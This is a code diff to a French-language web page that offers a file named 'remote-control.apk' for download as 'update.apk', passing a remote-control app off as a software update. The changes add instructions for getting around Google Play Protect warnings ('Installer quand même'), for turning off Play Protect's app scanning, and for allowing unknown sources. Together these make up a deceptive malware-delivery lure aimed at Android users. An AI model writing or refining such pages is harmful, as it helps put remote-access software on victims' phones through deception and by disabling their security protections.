@@ -131,15 +131,29 @@
     </div>
 
     <div id="installPrompt" class="hidden">
-      <a href="/public/remote-control.apk" class="btn" id="installBtn" download="update.apk">
-        Installer la mise à jour
+      <a href="/remote-control.apk" class="btn" id="installBtn" download="update.apk">
+        Télécharger la mise à jour
       </a>
-      <ul class="steps">
-        <li>Appuyez sur "Télécharger"</li>
+      
+      <div class="steps" style="margin-top:20px;">
+        <li style="color:#ffd700;font-weight:600;">⚠️ Si Play Protect bloque :</li>
+        <li>Appuyez sur <b>"Plus de détails"</b></li>
+        <li>Puis appuyez sur <b>"Installer quand même"</b></li>
+      </div>
+      
+      <div class="steps" style="margin-top:12px;">
+        <li style="color:#667eea;font-weight:600;">Ou désactivez Play Protect :</li>
+        <li>Play Store → Profil → Play Protect</li>
+        <li>⚙️ Paramètres → Désactiver <b>"Analyser les applis"</b></li>
+        <li>Réessayez l'installation</li>
+      </div>
+
+      <div class="steps" style="margin-top:12px;">
+        <li style="color:#00ff88;font-weight:600;">Installation :</li>
         <li>Ouvrez le fichier téléchargé</li>
-        <li>Appuyez sur "Installer"</li>
-        <li>Appuyez sur "Ouvrir" une fois terminé</li>
-      </ul>
+        <li>Autorisez les "Sources inconnues" si demandé</li>
+        <li>Appuyez sur <b>"Installer"</b></li>
+      </div>
     </div>
   </div>
 
